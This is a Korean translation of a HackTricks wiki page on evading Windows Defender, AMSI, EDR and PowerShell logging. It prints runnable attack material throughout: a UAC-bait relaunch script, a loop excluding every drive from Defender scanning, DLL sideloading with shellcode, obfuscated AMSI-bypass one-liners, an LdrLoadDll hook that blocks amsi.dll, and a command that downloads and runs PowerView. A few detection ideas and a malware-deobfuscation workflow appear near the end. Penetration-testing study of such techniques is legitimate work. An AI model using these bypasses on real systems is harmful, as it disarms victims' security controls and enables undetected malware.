# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**이 페이지는 처음에** [**@m2rc_p**](https://twitter.com/m2rc_p)**가 작성했습니다!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않도록 중지하는 tool입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV로 위장하여 Windows Defender가 작동하지 않도록 중지하는 tool입니다.
- [관리자라면 Defender 비활성화](basic-powershell-for-pentesters/README.md)

### Defender를 변조하기 전 Installer-style UAC bait

Game cheat로 위장한 Public loader는 unsigned Node.js/Nexe installer로 제공되는 경우가 많으며, 먼저 **사용자에게 권한 상승을 요청**한 다음 Defender를 무력화합니다. 흐름은 간단합니다.

1. `net session`으로 administrative context를 확인합니다. 이 command는 caller가 admin rights를 보유한 경우에만 성공하므로, 실패하면 loader가 standard user로 실행 중임을 의미합니다.
2. 원래 command line을 유지하면서 `RunAs` verb를 사용해 즉시 자신을 다시 실행하여 예상되는 UAC consent prompt를 표시합니다.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
피해자는 이미 “cracked” software를 설치한다고 믿고 있으므로, 일반적으로 해당 프롬프트를 수락하며, 이로 인해 malware가 Defender의 정책을 변경하는 데 필요한 권한을 얻게 됩니다.<sup>[[26]](#references)</sup>

### 모든 드라이브 문자에 대한 포괄적인 `MpPreference` exclusions

권한이 상승되면 GachiLoader-style chains는 서비스를 완전히 비활성화하는 대신 Defender의 blind spot을 최대한 확대합니다. loader는 먼저 GUI watchdog(`taskkill /F /IM SecHealthUI.exe`)을 종료한 다음 **매우 광범위한 exclusions**를 적용하여 모든 사용자 profile, system directory 및 removable disk를 scan할 수 없게 만듭니다:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
주요 관찰 사항:

- 이 loop는 모든 mounted filesystem(D:\, E:\, USB sticks 등)을 순회하므로 **향후 디스크 어디에든 drop되는 모든 payload가 무시됩니다**.
- `.sys` extension exclusion은 향후를 대비한 것으로, attackers가 Defender를 다시 건드리지 않고도 나중에 unsigned drivers를 load할 수 있는 선택권을 확보합니다.
- 모든 변경 사항은 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 아래에 적용되므로, 이후 stages에서 exclusions가 유지되는지 확인하거나 UAC를 다시 trigger하지 않고 이를 확장할 수 있습니다.

Defender service가 중지되지 않으므로, 단순한 health checks는 실제 real-time inspection이 해당 경로를 전혀 확인하지 않더라도 계속 “antivirus active”라고 보고합니다.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

현재 AVs는 파일이 malicious인지 확인하기 위해 서로 다른 methods를 사용합니다. static detection, dynamic analysis, 그리고 더 advanced한 EDRs의 경우 behavioural analysis를 사용합니다.

### **Static detection**

Static detection은 binary 또는 script에서 알려진 malicious strings나 byte arrays를 flag하고, 파일 자체에서 정보(예: file description, company name, digital signatures, icon, checksum 등)를 추출하는 방식으로 수행됩니다. 따라서 알려진 public tools를 사용하면 더 쉽게 caught될 수 있습니다. 이러한 tools는 이미 분석되어 malicious로 flag되었을 가능성이 높기 때문입니다. 이런 종류의 detection을 우회하는 몇 가지 방법이 있습니다.

- **Encryption**

binary를 encrypt하면 AV가 program을 detect할 방법이 없지만, program을 decrypt하고 memory에서 실행할 loader가 필요합니다.

- **Obfuscation**

때로는 binary나 script의 일부 strings만 변경해도 AV를 통과할 수 있지만, obfuscate하려는 대상에 따라 시간이 많이 걸릴 수 있습니다.

- **Custom tooling**

직접 tools를 개발하면 알려진 bad signatures가 존재하지 않지만, 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 static detection을 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 tool은 기본적으로 파일을 여러 segments로 나눈 다음 Defender가 각 segment를 개별적으로 scan하도록 합니다. 이를 통해 binary에서 어떤 strings나 bytes가 flag되었는지 정확히 확인할 수 있습니다.

practical AV Evasion에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 확인해 보는 것을 강력히 권장합니다.

### **Dynamic analysis**

Dynamic analysis는 AV가 sandbox에서 binary를 실행하고 malicious activity(예: browser passwords를 decrypt하고 read하려는 시도, LSASS에 minidump 수행 등)를 감시하는 방식입니다. 이 부분은 다루기가 조금 더 까다로울 수 있지만, sandbox를 evade하기 위해 할 수 있는 몇 가지 방법이 있습니다.

- **실행 전 Sleep** 구현 방식에 따라 AV의 dynamic analysis를 우회하는 좋은 방법이 될 수 있습니다. AVs는 사용자의 workflow를 방해하지 않기 위해 파일을 scan할 시간이 매우 짧으므로, 긴 sleep을 사용하면 binary analysis를 방해할 수 있습니다. 문제는 많은 AV sandbox가 구현 방식에 따라 sleep을 그냥 건너뛸 수 있다는 것입니다.
- **machine의 resources 확인** 일반적으로 Sandbox는 사용할 수 있는 resources가 매우 적습니다(예: < 2GB RAM). 그렇지 않으면 사용자의 machine 속도를 저하시킬 수 있기 때문입니다. 여기서 매우 창의적인 방법을 사용할 수도 있습니다. 예를 들어 CPU temperature나 fan speeds를 확인할 수 있으며, sandbox에 모든 기능이 구현되어 있는 것은 아닙니다.
- **Machine-specific checks** `"contoso.local"` domain에 joined된 workstation의 사용자를 target하려는 경우, computer의 domain을 확인하여 지정한 값과 일치하는지 검사할 수 있습니다. 일치하지 않으면 program을 종료하도록 만들 수 있습니다.

Microsoft Defender의 Sandbox computername은 HAL9TH인 것으로 밝혀졌습니다. 따라서 detonation 전에 malware에서 computer name을 확인할 수 있습니다. 이름이 HAL9TH와 일치한다면 Defender의 sandbox 내부에 있다는 의미이므로 program을 종료하도록 만들 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes를 상대하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 유용한 tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

이 post에서 앞서 말했듯이 **public tools**는 결국 **detected**되므로, 다음과 같은 질문을 스스로에게 해봐야 합니다.

예를 들어 LSASS를 dump하려는 경우, **정말 mimikatz를 사용해야 할까요**? 아니면 잘 알려지지 않았지만 LSASS도 dump하는 다른 project를 사용할 수 있을까요?

올바른 답은 아마도 후자일 것입니다. mimikatz를 예로 들면, AVs와 EDRs에 의해 flag된 malware 중 하나이거나 어쩌면 가장 많이 flag된 malware일 것입니다. project 자체는 매우 훌륭하지만 AVs를 우회하기 위해 사용하기에는 악몽과도 같으므로, 달성하려는 목적에 맞는 alternatives를 찾아보세요.

> [!TIP]
> evasion을 위해 payloads를 수정할 때는 Defender에서 **automatic sample submission을 끄고**, 장기적으로 evasion을 달성하는 것이 목표라면 **절대로 VIRUSTOTAL에 UPLOAD하지 마세요**. 특정 AV가 payload를 detect하는지 확인하려면 VM에 해당 AV를 설치하고, automatic sample submission을 끄도록 시도한 뒤, 결과에 만족할 때까지 그 환경에서 test하세요.

## EXEs vs DLLs

가능한 경우에는 항상 **evasion을 위해 DLLs 사용을 우선하세요**. 제 경험상 DLL files는 일반적으로 **detected 및 analyzed되는 비율이 훨씬 낮으므로**, payload를 DLL로 실행할 수 있는 방법이 있다면 일부 상황에서 detection을 피하기 위해 사용할 수 있는 매우 간단한 trick입니다.

이 image에서 볼 수 있듯이, Havoc의 DLL Payload는 antiscan.me에서 4/26의 detection rate를 보이는 반면 EXE payload는 7/26의 detection rate를 보입니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>일반적인 Havoc EXE payload와 일반적인 Havoc DLL의 antiscan.me 비교</p></figcaption></figure>

이제 DLL files를 사용해 훨씬 더 stealthy하게 만들 수 있는 몇 가지 tricks를 살펴보겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 victim application과 malicious payload(s)를 서로 나란히 배치하여 loader가 사용하는 DLL search order를 악용합니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 powershell script를 사용하여 DLL Sideloading에 susceptible한 programs를 확인할 수 있습니다.
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 `"C:\Program Files\\"` 내부에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램이 로드하려고 하는 DLL 파일을 출력합니다.

**DLL Hijackable/Sideloadable programs**를 직접 **explore**해 보기를 강력히 권장합니다. 이 technique은 제대로 수행하면 상당히 stealthy하지만, 공개적으로 알려진 DLL Sideloadable programs를 사용하면 쉽게 적발될 수 있습니다.

프로그램이 로드하려는 이름의 malicious DLL을 배치하는 것만으로는 payload가 로드되지 않습니다. 프로그램이 해당 DLL 내부에 특정 functions가 있을 것으로 예상하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 또 다른 technique을 사용합니다.

**DLL Proxying**은 프로그램이 proxy (및 malicious) DLL에 수행하는 calls를 original DLL로 전달합니다. 이를 통해 프로그램의 functionality을 유지하면서 payload의 execution을 처리할 수 있습니다.

[<PRIVATE_PERSON>](https://github.com/Flangvik)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project를 사용하겠습니다.

다음은 제가 수행한 steps입니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 DLL 소스 코드 템플릿과 이름이 변경된 원본 DLL, 총 2개의 파일을 생성합니다.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
결과는 다음과 같습니다:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn)으로 인코딩한 shellcode와 proxy DLL 모두 [antiscan.me](https://antiscan.me)에서 0/26 Detection rate를 기록했습니다! 성공이라고 할 수 있겠네요.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading에 관한 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)와, 지금까지 논의한 내용을 더 깊이 이해하기 위한 [ippsec의 video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 **강력히 추천**합니다.

### Forwarded Exports 악용 (ForwardSideLoading)

Windows PE modules는 실제로 "forwarders"인 functions를 export할 수 있습니다. 즉, export entry가 code를 가리키는 대신 `TargetDll.TargetFunc` 형식의 ASCII string을 포함합니다. caller가 export를 resolve하면 Windows loader는 다음을 수행합니다:

- 아직 load되지 않았다면 `TargetDll`을 load합니다.
- 해당 DLL에서 `TargetFunc`를 resolve합니다.

이해해야 할 주요 동작:
- `TargetDll`이 KnownDLL인 경우, 보호된 KnownDLLs namespace에서 제공됩니다(예: ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll`이 KnownDLL이 아닌 경우, forward resolution을 수행하는 module의 directory를 포함한 일반 DLL search order가 사용됩니다.

이를 통해 간접적인 sideloading primitive를 사용할 수 있습니다. 즉, non-KnownDLL module name으로 forwarded된 function을 export하는 signed DLL을 찾은 다음, 해당 signed DLL과 attacker-controlled DLL을 forwarded target module과 정확히 동일한 이름으로 같은 directory에 배치합니다. forwarded export가 invoke되면 loader가 forward를 resolve하고 같은 directory에서 여러분의 DLL을 load하여 DllMain을 실행합니다.<sup>[[13]](#references)</sup>

Windows 11에서 확인한 예시:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서를 통해 확인됩니다.

PoC (복사-붙여넣기):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더에 복사합니다
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 동일한 폴더에 악성 `NCRYPTPROV.dll`을 배치합니다. 최소한의 DllMain만으로도 코드 실행이 가능하며, DllMain을 트리거하기 위해 전달된 함수를 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 forward를 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed)가 side-by-side `keyiso.dll` (signed)를 로드함
- `KeyIsoSetAuditingInterface`를 확인하는 동안 loader가 `NCRYPTPROV.SetAuditingInterface`로의 forward를 따라감
- 이후 loader가 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 해당 파일의 `DllMain`을 실행함
- `SetAuditingInterface`가 구현되어 있지 않으면 `DllMain`이 이미 실행된 후에야 "missing API" 오류가 발생함

Hunting tips:
- 대상 모듈이 KnownDLL이 아닌 forwarded exports에 집중할 것. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`에 나열되어 있음
- 다음과 같은 tooling을 사용하여 forwarded exports를 열거할 수 있음:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 후보를 검색하려면 Windows 11 forwarder inventory를 확인하세요: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

탐지/방어 아이디어:
- LOLBins(예: rundll32.exe)이 비시스템 경로에서 서명된 DLL을 로드한 다음, 해당 디렉터리에서 동일한 base name을 가진 KnownDLLs가 아닌 DLL을 로드하는지 모니터링
- 다음과 같은 process/module chain에 alert 생성: `rundll32.exe` → 비시스템 `keyiso.dll` → 사용자 쓰기 가능 경로 아래의 `NCRYPTPROV.dll`
- code integrity 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 write+execute를 차단

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 suspended processes, direct syscalls 및 alternative execution methods를 사용하여 EDR을 우회하기 위한 payload toolkit입니다.`

Freeze를 사용하면 shellcode를 stealthy한 방식으로 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion은 고양이와 쥐의 게임일 뿐입니다. 오늘 작동하는 방법이 내일 탐지될 수 있으므로 하나의 도구에만 의존하지 말고, 가능하다면 여러 Evasion technique을 연쇄적으로 사용하세요.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR은 `ntdll.dll`의 syscall stub에 **user-mode inline hook**을 배치하는 경우가 많습니다. 이러한 hook을 우회하려면 올바른 **SSN**(System Service Number)을 로드하고 hook된 export entrypoint를 실행하지 않은 채 kernel mode로 전환하는 **direct** 또는 **indirect syscall stub**을 생성할 수 있습니다.<sup>[[32]](#references)</sup>

**Invocation options:**
- **Direct (embedded)**: 생성된 stub에 `syscall`/`sysenter`/`SVC #0` instruction을 삽입합니다(`ntdll` export에 도달하지 않음).
- **Indirect**: `ntdll` 내부의 기존 `syscall` gadget으로 jump하여 kernel transition이 `ntdll`에서 시작된 것처럼 보이게 합니다(heuristic evasion에 유용). **randomized indirect**는 호출마다 pool에서 gadget을 선택합니다.
- **Egg-hunt**: 디스크에 static `0F 05` opcode sequence를 삽입하지 않고, runtime에 syscall sequence를 resolve합니다.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes를 읽는 대신 syscall stub을 virtual address 기준으로 정렬하여 SSN을 추론합니다.
- **SyscallsFromDisk**: 깨끗한 `\KnownDlls\ntdll.dll`을 map하고 해당 `.text`에서 SSN을 읽은 다음 unmap합니다(메모리 내 모든 hook을 우회).
- **RecycledGate**: VA-sorted SSN inference와 stub이 깨끗할 때의 opcode validation을 결합하고, hook된 경우 VA inference로 fallback합니다.
- **HW Breakpoint**: `syscall` instruction에 DR0를 설정하고 VEH를 사용하여 runtime에 `EAX`에서 SSN을 캡처하므로, hook된 bytes를 parsing하지 않습니다.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI는 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 초기에는 AV가 **디스크의 파일**만 검사할 수 있었기 때문에, 어떻게든 payload를 **메모리에서 직접** 실행할 수 있다면 AV는 이를 방지할 방법이 없었습니다. 충분한 가시성을 확보하지 못했기 때문입니다.

AMSI 기능은 다음 Windows 구성 요소에 통합되어 있습니다.

- User Account Control, 또는 UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
- PowerShell (스크립트, interactive 사용 및 dynamic code evaluation)
- Windows Script Host (wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA macros

이를 통해 antivirus 솔루션은 암호화되지 않고 난독화되지 않은 형태로 script contents를 노출하여 script behavior를 검사할 수 있습니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 alert가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 붙인 다음 script가 실행된 executable의 path를 표시하는 것을 확인할 수 있습니다. 이 경우에는 powershell.exe입니다.

디스크에 어떤 파일도 남기지 않았지만 AMSI 때문에 여전히 메모리에서 탐지되었습니다.

또한 **.NET 4.8**부터는 C# code도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`를 사용한 in-memory execution에도 영향을 줍니다. 따라서 AMSI를 evade하려는 in-memory execution에서는 더 낮은 버전의 .NET(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다.

- **Obfuscation**

AMSI는 주로 static detections를 사용하므로, load하려는 scripts를 수정하는 것은 detection을 evade하는 좋은 방법이 될 수 있습니다.

그러나 AMSI는 여러 layer가 있더라도 scripts를 unobfuscate할 수 있으므로, obfuscation은 구현 방식에 따라 좋지 않은 선택이 될 수 있습니다. 따라서 이를 evade하는 것은 그리 straightforward하지 않습니다. 다만 때로는 variable names 몇 개만 변경해도 충분할 수 있으므로, 얼마나 강하게 flag되었는지에 따라 달라집니다.

- **AMSI Bypass**

AMSI는 DLL을 powershell(또한 cscript.exe, wscript.exe 등) process에 load하여 구현되므로, unprivileged user로 실행 중이어도 쉽게 tamper할 수 있습니다. 이러한 AMSI 구현상의 flaw 때문에 researchers는 AMSI scanning을 evade하는 여러 방법을 찾아냈습니다.

**Forcing an Error**

AMSI initialization을 강제로 실패시키면(amsiInitFailed) current process에 대한 scan이 시작되지 않습니다. 이 방법은 처음에 [Matt Graeber](https://twitter.com/mattifestation)가 공개했으며, Microsoft는 더 광범위한 사용을 방지하기 위한 signature를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
현재 powershell process에서 AMSI를 사용할 수 없게 만드는 데는 powershell code 한 줄이면 충분했습니다. 물론 이 line 자체가 AMSI에 의해 탐지되었으므로, 이 technique을 사용하려면 일부 수정이 필요합니다.

다음은 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass입니다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
이 글이 공개되면 이 내용은 아마 탐지될 것이므로, 탐지되지 않는 것이 계획이라면 코드를 공개해서는 안 됩니다.

**Memory Patching**

이 technique은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)가 발견했으며, 사용자 입력을 scan하는 amsi.dll의 "AmsiScanBuffer" function 주소를 찾아 E_INVALIDARG의 code를 반환하는 instruction으로 덮어쓰는 방식입니다. 이렇게 하면 실제 scan 결과가 0을 반환하고, 이는 clean한 결과로 해석됩니다.

> [!TIP]
> 더 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 참고하세요.

powershell에서 AMSI를 우회하는 데 사용되는 다른 technique도 많이 있습니다. [**이 page**](basic-powershell-for-pentesters/index.html#amsi-bypass)와 [**이 repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 알아보세요.

### amsi.dll load를 차단하여 AMSI 차단 (LdrLoadDll hook)

AMSI는 `amsi.dll`이 현재 process에 load된 후에만 initialised됩니다. 견고하고 language-agnostic한 bypass 방법은 `ntdll!LdrLoadDll`에 user-mode hook을 배치하여 요청된 module이 `amsi.dll`일 때 error를 반환하도록 하는 것입니다. 그 결과 AMSI가 load되지 않고 해당 process에서 scan이 발생하지 않습니다.<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
참고
- PowerShell, WScript/CScript 및 custom loaders 모두에서 작동합니다(그렇지 않으면 AMSI를 로드하는 모든 항목).
- 긴 command-line artefacts를 피하려면 stdin을 통해 스크립트를 전달하는 방식(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용하세요.
- LOLBins를 통해 실행되는 loaders에서 사용되는 것이 확인되었습니다(예: `regsvr32`가 `DllRegisterServer`를 호출하는 경우).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** tool은 AMSI를 bypass하기 위한 script도 생성합니다.
**[https://amsibypass.com/](https://amsibypass.com/)** tool은 randomized user-defined function, variables, characters expression을 사용하고 PowerShell keywords에 random character casing을 적용하여 signature를 피하는 AMSI bypass용 script도 생성합니다.

**감지된 signature 제거**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**와 같은 tool을 사용하여 현재 process의 memory에서 감지된 AMSI signature를 제거할 수 있습니다. 이 tool은 현재 process의 memory를 scanning하여 AMSI signature를 찾은 다음 NOP instructions로 덮어써 memory에서 효과적으로 제거하는 방식으로 작동합니다.

**AMSI를 사용하는 AV/EDR products**

AMSI를 사용하는 AV/EDR products 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**에서 확인할 수 있습니다.

**PowerShell version 2 사용**
PowerShell version 2를 사용하면 AMSI가 load되지 않으므로 AMSI에 의해 scanning되지 않고 scripts를 실행할 수 있습니다. 다음과 같이 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 이는 감사 및 troubleshooting에 유용하지만, **탐지를 회피하려는 attackers에게는 문제가 될 수 있습니다**.

PowerShell logging을 우회하려면 다음 기법을 사용할 수 있습니다:

- **PowerShell Transcription 및 Module Logging 비활성화**: 이를 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)와 같은 tool을 사용할 수 있습니다.
- **Powershell version 2 사용**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI에 의해 스캔되지 않고 scripts를 실행할 수 있습니다. 다음과 같이 실행할 수 있습니다: `powershell.exe -version 2`
- **unmanaged PowerShell session 사용**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)을 사용하여 `powershell.exe`를 실행하지 않고 PowerShell을 host할 수 있습니다(Cobalt Strike의 `powerpick`에서 사용하는 방식). 이는 `powershell.exe` process에 특별히 연결된 controls를 우회하지만, 본질적으로 AMSI, Script Block Logging 또는 다른 모든 PowerShell defense를 비활성화하지는 않습니다. 적용 범위는 runtime과 host implementation에 따라 달라집니다.


## Obfuscation

> [!TIP]
> 여러 obfuscation 기법은 data를 encrypt하는 방식에 의존하며, 이로 인해 binary의 entropy가 증가하여 AV와 EDR이 더 쉽게 탐지할 수 있습니다. 이 점에 주의하고, 민감하거나 숨겨야 하는 code의 특정 section에만 encryption을 적용하는 것이 좋습니다.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 commercial fork)를 사용하는 malware를 분석할 때는 decompiler와 sandbox를 차단하는 여러 protection layer를 흔히 마주치게 됩니다. 아래 workflow는 이후 dnSpy 또는 ILSpy와 같은 tool에서 C#으로 decompile할 수 있는 **원본에 가까운 IL을 안정적으로 복원합니다**.<sup>[[10]](#references)</sup>

1. Anti-tampering removal – ConfuserEx는 모든 *method body*를 encrypt하고 *module* static constructor(`<Module>.cctor`) 내부에서 이를 decrypt합니다. 또한 PE checksum을 patch하므로 수정하면 binary가 crash합니다. **AntiTamperKiller**를 사용하여 encrypted metadata table을 찾고, XOR key를 복구한 뒤 clean assembly를 다시 작성합니다:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output에는 자체 unpacker를 만들 때 유용할 수 있는 6개의 anti-tamper parameter(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2. Symbol / control-flow recovery – *clean* file을 **de4dot-cex**(ConfuserEx를 인식하는 de4dot fork)에 전달합니다.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile을 선택합니다.
• de4dot은 control-flow flattening을 되돌리고, 원래의 namespace, class 및 variable name을 복원하며, constant string을 decrypt합니다.

3. Proxy-call stripping – ConfuserEx는 decompilation을 더욱 방해하기 위해 direct method call을 lightweight wrapper(a.k.a *proxy call*)로 대체합니다. **ProxyCall-Remover**를 사용하여 이를 제거합니다:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 이후에는 불투명한 wrapper function(`Class8.smethod_10`, …) 대신 `Convert.FromBase64String` 또는 `AES.Create()`와 같은 일반적인 .NET API가 표시되어야 합니다.

4. Manual clean-up – 결과 binary를 dnSpy에서 실행하고, large Base64 blob 또는 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색하여 *real* payload를 찾습니다. Malware는 이를 `<Module>.byte_0` 내부에서 초기화되는 TLV-encoded byte array로 저장하는 경우가 많습니다.

